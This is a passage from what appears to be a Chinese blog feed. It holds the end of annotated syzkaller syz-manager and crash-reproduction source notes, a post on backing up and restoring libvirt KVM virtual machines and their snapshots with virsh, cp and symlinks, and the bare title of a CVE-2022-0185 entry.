	outc<span class="token punctuation">,</span> errc<span class="token punctuation">,</span> err <span class="token operator">:=</span> inst<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span>mgr<span class="token punctuation">.</span>cfg<span class="token punctuation">.</span>Timeouts<span class="token punctuation">.</span>VMRunningTime<span class="token punctuation">,</span> mgr<span class="token punctuation">.</span>vmStop<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span> <span class="token comment">// 「3」</span>
<span class="token comment">// ...</span>

	<span class="token keyword">var</span> vmInfo <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span>
	rep <span class="token operator">:=</span> inst<span class="token punctuation">.</span><span class="token function">MonitorExecution</span><span class="token punctuation">(</span>outc<span class="token punctuation">,</span> errc<span class="token punctuation">,</span> mgr<span class="token punctuation">.</span>reporter<span class="token punctuation">,</span> vm<span class="token punctuation">.</span>ExitTimeout<span class="token punctuation">)</span> 「<span class="token number">4</span>」
	<span class="token keyword">if</span> rep <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">// ...</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		vmInfo<span class="token punctuation">,</span> err <span class="token operator">=</span> inst<span class="token punctuation">.</span><span class="token function">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">// ...</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">return</span> rep<span class="token punctuation">,</span> vmInfo<span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>「1」</strong>，复制 syz-fuzzer 到虚拟机中</p>
<p><strong>「2」</strong>，复制 syz-executor 到虚拟机中</p>
<p><strong>「3」</strong>，ssh 执行虚拟机里的 syz-fuzzer</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// vm/qemu/qemu.go</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>inst <span class="token operator">*</span>instance<span class="token punctuation">)</span> <span class="token function">Run</span><span class="token punctuation">(</span>timeout time<span class="token punctuation">.</span>Duration<span class="token punctuation">,</span> stop <span class="token operator">&lt;-</span><span class="token keyword">chan</span> <span class="token builtin">bool</span><span class="token punctuation">,</span> command <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>
	<span class="token operator">&lt;-</span><span class="token keyword">chan</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token operator">&lt;-</span><span class="token keyword">chan</span> <span class="token builtin">error</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">// ...</span>

	sshArgs <span class="token operator">:=</span> vmimpl<span class="token punctuation">.</span><span class="token function">SSHArgsForward</span><span class="token punctuation">(</span>inst<span class="token punctuation">.</span>debug<span class="token punctuation">,</span> inst<span class="token punctuation">.</span>sshkey<span class="token punctuation">,</span> inst<span class="token punctuation">.</span>port<span class="token punctuation">,</span> inst<span class="token punctuation">.</span>forwardPort<span class="token punctuation">)</span>
	<span class="token comment">// ...</span>
	
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"ssh"</span><span class="token punctuation">&#125;</span>
		args <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> sshArgs<span class="token operator">...</span><span class="token punctuation">)</span>
		args <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> inst<span class="token punctuation">.</span>sshuser<span class="token operator">+</span><span class="token string">"@localhost"</span><span class="token punctuation">,</span> <span class="token string">"cd "</span><span class="token operator">+</span>inst<span class="token punctuation">.</span><span class="token function">targetDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" &amp;&amp; "</span><span class="token operator">+</span>command<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> inst<span class="token punctuation">.</span>debug <span class="token punctuation">&#123;</span>
		log<span class="token punctuation">.</span><span class="token function">Logf</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"running command: %#v"</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
	cmd <span class="token operator">:=</span> osutil<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span>
	<span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><strong>「4」</strong>，监控虚拟机 oops 信息，用 <code>bytes.Contains</code> 检查是否有特征序列来查看是否出现了 crash</p>
<h5 id="repro-Run"><a href="#repro-Run" class="headerlink" title="repro.Run"></a>repro.Run</h5><p>最主要就是调用了 <code>ctx.repro</code></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// pkg/repro/repro.go</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>ctx <span class="token operator">*</span>context<span class="token punctuation">)</span> <span class="token function">repro</span><span class="token punctuation">(</span>entries <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>prog<span class="token punctuation">.</span>LogEntry<span class="token punctuation">,</span> crashStart <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>Result<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">// ...</span>

	res<span class="token punctuation">,</span> err <span class="token operator">:=</span> ctx<span class="token punctuation">.</span><span class="token function">extractProg</span><span class="token punctuation">(</span>entries<span class="token punctuation">)</span> <span class="token comment">// 「1」</span>

<span class="token comment">// ...</span>

	res<span class="token punctuation">,</span> err <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">minimizeProg</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">// 「2」</span>

<span class="token comment">// ...</span>

	<span class="token comment">// Try extracting C repro without simplifying options first.</span>
	res<span class="token punctuation">,</span> err <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">extractC</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">// 「3」</span>

<span class="token comment">// ...</span>

	<span class="token comment">// Simplify options and try extracting C repro.</span>
	<span class="token keyword">if</span> <span class="token operator">!</span>res<span class="token punctuation">.</span>CRepro <span class="token punctuation">&#123;</span>
		res<span class="token punctuation">,</span> err <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">simplifyProg</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">// 「4」</span>
<span class="token comment">// ...</span>
	<span class="token punctuation">&#125;</span>

	<span class="token comment">// Simplify C related options.</span>
	<span class="token keyword">if</span> res<span class="token punctuation">.</span>CRepro <span class="token punctuation">&#123;</span>
		res<span class="token punctuation">,</span> err <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">simplifyC</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">// 「5」</span>
<span class="token comment">// ...</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">return</span> res<span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><strong>「1」</strong>，提取出造成 crash 的程序</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// pkg/repro/repro.go</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>ctx <span class="token operator">*</span>context<span class="token punctuation">)</span> <span class="token function">extractProg</span><span class="token punctuation">(</span>entries <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>prog<span class="token punctuation">.</span>LogEntry<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>Result<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">// ...</span>

	<span class="token comment">// Extract last program on every proc.</span>
	procs <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>
	<span class="token keyword">for</span> i<span class="token punctuation">,</span> ent <span class="token operator">:=</span> <span class="token keyword">range</span> entries <span class="token punctuation">&#123;</span>
		procs<span class="token punctuation">[</span>ent<span class="token punctuation">.</span>Proc<span class="token punctuation">]</span> <span class="token operator">=</span> i
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">var</span> indices <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> idx <span class="token operator">:=</span> <span class="token keyword">range</span> procs <span class="token punctuation">&#123;</span>
		indices <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>indices<span class="token punctuation">,</span> idx<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
	sort<span class="token punctuation">.</span><span class="token function">Ints</span><span class="token punctuation">(</span>indices<span class="token punctuation">)</span>
	<span class="token keyword">var</span> lastEntries <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>prog<span class="token punctuation">.</span>LogEntry
	<span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token function">len</span><span class="token punctuation">(</span>indices<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 倒序存储执行的程序</span>
		lastEntries <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>lastEntries<span class="token punctuation">,</span> entries<span class="token punctuation">[</span>indices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> timeout <span class="token operator">:=</span> <span class="token keyword">range</span> ctx<span class="token punctuation">.</span>testTimeouts <span class="token punctuation">&#123;</span>
		<span class="token comment">// Execute each program separately to detect simple crashes caused by a single program.</span>
		<span class="token comment">// Programs are executed in reverse order, usually the last program is the guilty one.</span>
		res<span class="token punctuation">,</span> err <span class="token operator">:=</span> ctx<span class="token punctuation">.</span><span class="token function">extractProgSingle</span><span class="token punctuation">(</span>lastEntries<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>  <span class="token comment">// 一个一个执行单个程序，直到触发 crash </span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> res <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
			ctx<span class="token punctuation">.</span><span class="token function">reproLogf</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"found reproducer with %d syscalls"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>Prog<span class="token punctuation">.</span>Calls<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span> res<span class="token punctuation">,</span> <span class="token boolean">nil</span>
		<span class="token punctuation">&#125;</span>

		<span class="token comment">// Don't try bisecting if there's only one entry.</span>
		<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>entries<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">continue</span>
		<span class="token punctuation">&#125;</span>

		<span class="token comment">// Execute all programs and bisect the log to find multiple guilty programs.</span>
		res<span class="token punctuation">,</span> err <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">extractProgBisect</span><span class="token punctuation">(</span>entries<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span> <span class="token comment">// 单个程序无法触发 crash，可能需要多个程序</span>
		
<span class="token comment">// ...</span>
	<span class="token punctuation">&#125;</span>

<span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><strong>「2」</strong>，简化调用和参数</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// pkg/repro/repro.go</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>ctx <span class="token operator">*</span>context<span class="token punctuation">)</span> <span class="token function">minimizeProg</span><span class="token punctuation">(</span>res <span class="token operator">*</span>Result<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>Result<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">// ...</span>
	res<span class="token punctuation">.</span>Prog<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> prog<span class="token punctuation">.</span><span class="token function">Minimize</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>Prog<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
		<span class="token keyword">func</span><span class="token punctuation">(</span>p1 <span class="token operator">*</span>prog<span class="token punctuation">.</span>Prog<span class="token punctuation">,</span> callIndex <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>
			crashed<span class="token punctuation">,</span> err <span class="token operator">:=</span> ctx<span class="token punctuation">.</span><span class="token function">testProg</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> res<span class="token punctuation">.</span>Duration<span class="token punctuation">,</span> res<span class="token punctuation">.</span>Opts<span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
				ctx<span class="token punctuation">.</span><span class="token function">reproLogf</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"minimization failed with %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
				<span class="token keyword">return</span> <span class="token boolean">false</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">return</span> crashed
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

	<span class="token keyword">return</span> res<span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// prog/minimization.go</span>

<span class="token keyword">func</span> <span class="token function">Minimize</span><span class="token punctuation">(</span>p0 <span class="token operator">*</span>Prog<span class="token punctuation">,</span> callIndex0 <span class="token builtin">int</span><span class="token punctuation">,</span> crash <span class="token builtin">bool</span><span class="token punctuation">,</span> pred0 <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token operator">*</span>Prog<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>Prog<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	pred <span class="token operator">:=</span> <span class="token keyword">func</span><span class="token punctuation">(</span>p <span class="token operator">*</span>Prog<span class="token punctuation">,</span> callIndex <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>
		p<span class="token punctuation">.</span><span class="token function">sanitizeFix</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		p<span class="token punctuation">.</span><span class="token function">debugValidate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token function">pred0</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> callIndex<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
<span class="token comment">// ...</span>

	<span class="token comment">// Try to remove all calls except the last one one-by-one.</span>
	p0<span class="token punctuation">,</span> callIndex0 <span class="token operator">=</span> <span class="token function">removeCalls</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> callIndex0<span class="token punctuation">,</span> crash<span class="token punctuation">,</span> pred<span class="token punctuation">)</span>

	<span class="token comment">// Try to reset all call props to their default values.</span>
	p0 <span class="token operator">=</span> <span class="token function">resetCallProps</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> callIndex0<span class="token punctuation">,</span> pred<span class="token punctuation">)</span>
	

	<span class="token comment">// Try to minimize individual calls.</span>
	<span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>p0<span class="token punctuation">.</span>Calls<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 去除系统调用无关的参数</span>
		ctx <span class="token operator">:=</span> <span class="token operator">&amp;</span>minimizeArgsCtx<span class="token punctuation">&#123;</span>
			target<span class="token punctuation">:</span>     p0<span class="token punctuation">.</span>Target<span class="token punctuation">,</span>
			p0<span class="token punctuation">:</span>         <span class="token operator">&amp;</span>p0<span class="token punctuation">,</span>
			callIndex0<span class="token punctuation">:</span> callIndex0<span class="token punctuation">,</span>
			crash<span class="token punctuation">:</span>      crash<span class="token punctuation">,</span>
			pred<span class="token punctuation">:</span>       pred<span class="token punctuation">,</span>
			triedPaths<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span>
	again<span class="token punctuation">:</span>
		ctx<span class="token punctuation">.</span>p <span class="token operator">=</span> p0<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		ctx<span class="token punctuation">.</span>call <span class="token operator">=</span> ctx<span class="token punctuation">.</span>p<span class="token punctuation">.</span>Calls<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
		<span class="token keyword">for</span> j<span class="token punctuation">,</span> field <span class="token operator">:=</span> <span class="token keyword">range</span> ctx<span class="token punctuation">.</span>call<span class="token punctuation">.</span>Meta<span class="token punctuation">.</span>Args <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> ctx<span class="token punctuation">.</span><span class="token function">do</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>call<span class="token punctuation">.</span>Args<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> field<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">goto</span> again
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		p0 <span class="token operator">=</span> <span class="token function">minimizeCallProps</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> i<span class="token punctuation">,</span> callIndex0<span class="token punctuation">,</span> pred<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
<span class="token comment">// ...</span>
	<span class="token keyword">return</span> p0<span class="token punctuation">,</span> callIndex0
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><strong>「3」</strong>，根据 crash 构造 C 代码</p>
<p><strong>「4」</strong>、<strong>「5」</strong>，简化构造成功的 C 代码</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://bsauce.github.io/2022/05/14/syzkaller2/">syzkaller 源码阅读笔记2（syz-manager） — bsauce</a></li>
<li><a href="https://sourcegraph.com/github.com/google/syzkaller@master">https://sourcegraph.com/github.com/google/syzkaller@master</a></li>
</ul>
]]></content>
      <categories>
        <category>syzkaller源码阅读笔记</category>
      </categories>
      <tags>
        <tag>syzkaller</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>kvm 虚拟机迁移笔记</title>
    <url>/8c042604/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这篇文章的起因是：本人笔记本电脑的硬盘太小了，换了个大的，需要重新配置系统（manjaro），重新虚拟机环境过于繁琐且没必要，于是乎考虑直接迁移虚拟机</p>
<span id="more"></span>

<blockquote>
<p><del>其实有一个非常粗暴的方法，直接把相关目录全拷贝一遍就好了</del></p>
</blockquote>
<h2 id="一些前提"><a href="#一些前提" class="headerlink" title="一些前提"></a>一些前提</h2><p>这篇文章是基于笔者的笔记本环境的，其中的一些操作要根据读者实际情况自行调整</p>
<ul>
<li>系统：manjaro linux</li>
<li>分区情况：<code>/</code> 和 <code>/home</code> 独立分区，之后打算虚拟机放到 <code>/home</code> 分区里，主要考虑到了重装系统，重装系统也只要覆盖根分区就好了，只需要简单调整下配置就能无缝衔接了</li>
<li>虚拟机环境：由 libvirt 工具管理的 kvm 虚拟机，一个 windows 10 ，一个 ubuntu 20.04（<del>不要问为什么主系统是 linux 还要配虚拟机 ubuntu</del>）</li>
</ul>
<h2 id="备份虚拟机"><a href="#备份虚拟机" class="headerlink" title="备份虚拟机"></a>备份虚拟机</h2><blockquote>
<p>因为笔者的笔记本只有一个硬盘插槽，所以在换硬盘前得做好虚拟机的备份</p>
</blockquote>
<p><strong>首先</strong>，要备份的虚拟机首先要处于<strong>关机</strong>状态，其他情况本文不考虑</p>
<p><strong>其次</strong>，备份虚拟机<strong>配置文件</strong>，也就是 virsh 使用的 xml 文件，下面以笔者的 ubuntu 20.04 虚拟机为例：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">virsh</span> dumpxml ubuntu20.04 <span class="token operator">></span> <span class="token variable">$backup</span>/ubuntu/ubuntu20.04.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>其中的 $backup 存放备份虚拟机所有文件的目录，迁移的时候只要拷贝这个目录就好了</p>
</blockquote>
<p><strong>然后</strong>，备份虚拟机的<strong>硬盘镜像文件</strong>，虚拟机的镜像存储在 <code>/var/lib/libvirt/images/</code> 目录下，把对应虚拟机的镜像备份好就行，例</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">cp</span> /var/lib/libvirt/images/ubuntu20.04.qcow2 <span class="token variable">$backup</span>/ubuntu/ubuntu20.04.qcow2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<blockquote>
<p>在这一步，突然意识到了问题，就是原有的盘存储空间不足以再存放一份镜像，并且笔者的 U 盘也无法存储足足有 100G 的镜像文件，直接上传到云盘上得等到猴年马月<br>于是乎马上下单外置硬盘盒，打算换好新硬盘装完系统后，直接把旧的硬盘插硬盘盒里接上电脑用，所以这一步笔者其实是直接从外置硬盘拷贝到换好新硬盘的笔记本上的</p>
</blockquote>
<p><strong>最后</strong>，理论上第三步就做好了，<strong>但是</strong>，<strong>虚拟机快照</strong>还没有备份，如果读者不需要备份虚拟机快照可以跳过这一步</p>
<p>笔者虚拟机使用的硬盘镜像格式都是 <strong>qcow2</strong>，快照是记录在镜像里的，使用如下命令查看：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">qemu-img snapshot -l xxx.qcow2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/images/8c042604/pasted-0.png" alt="snapshot1"></p>
<p>第一步已经备份好了镜像，那么快照是不是也备份好了呢？</p>
<p>是，也<strong>不完全是</strong>，对于镜像而言，快照就存储在镜像里，但是 libvirt 工具并不知道这些快照的状态，就是处于这些快照的时候，<strong>配置文件</strong>是什么样的无法通过镜像文件得知，所以还需要备份这些快照的配置文件</p>
<p>这些快照文件存储在 <code>/var/lib/libvirt/qemu/snapshot</code> 目录下：<br><img src="/images/8c042604/pasted-1.png" alt="snapshot2"></p>
<p>由于全部虚拟机都要迁移，所以直接备份整个目录就行了</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">cp</span> -r /var/lib/libvirt/qemu/snapshot <span class="token variable">$backup</span>/snapshot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="恢复虚拟机"><a href="#恢复虚拟机" class="headerlink" title="恢复虚拟机"></a>恢复虚拟机</h2><p>在上一步中备份好了虚拟机，然后把 $backup 的内容都拷贝到了新硬盘的 <code>$HOME/virtualmachine</code> 目录下，接下来就是恢复虚拟机了</p>
<p><strong>第一歩</strong>，导入虚拟机配置</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">virsh</span> define --file <span class="token environment constant">$HOME</span>/virtualmachine/ubuntu/ubuntu20.04.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>第二步</strong>，恢复镜像</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">cp</span> <span class="token environment constant">$HOME</span>/virtualmachine/ubuntu/ubuntu20.04.qcow2 /var/lib/libvirt/images/ubuntu20.04.qcow2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>笔者并不打算把虚拟机拷贝到根分区使用，重装系统前还得重新备份，所以这一步实际上笔者是直接用<strong>软连接</strong></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">ln</span> -sf <span class="token environment constant">$HOME</span>/virtualmachine/ubuntu/ubuntu20.04.qcow2 /var/lib/libvirt/images/ubuntu20.04.qcow2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>第三步</strong>，恢复快照</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">cp</span> -r <span class="token environment constant">$HOME</span>/virtualmachine/snapshot/ubuntu20.04 /var/lib/libvirt/qemu/snapshot/ubuntu20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>同理，笔者这一步用的也是软连接</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">ln</span> -sf <span class="token environment constant">$HOME</span>/virtualmachine/snapshot/ubuntu20.04 /var/lib/libvirt/qemu/snapshot/ubuntu20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后将虚拟机开启验证就好了，如果备份虚拟机的镜像文件名有更改，记得在配置文件里也修改为对应的路径</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.cnblogs.com/djlsunshine/p/10278363.html">https://www.cnblogs.com/djlsunshine/p/10278363.html</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1671091">https://cloud.tencent.com/developer/article/1671091</a></li>
</ol>
]]></content>
      <tags>
        <tag>kvm</tag>
        <tag>virsh</tag>
        <tag>migrate</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-0185</title>
    <url>/4161b49f/</url>
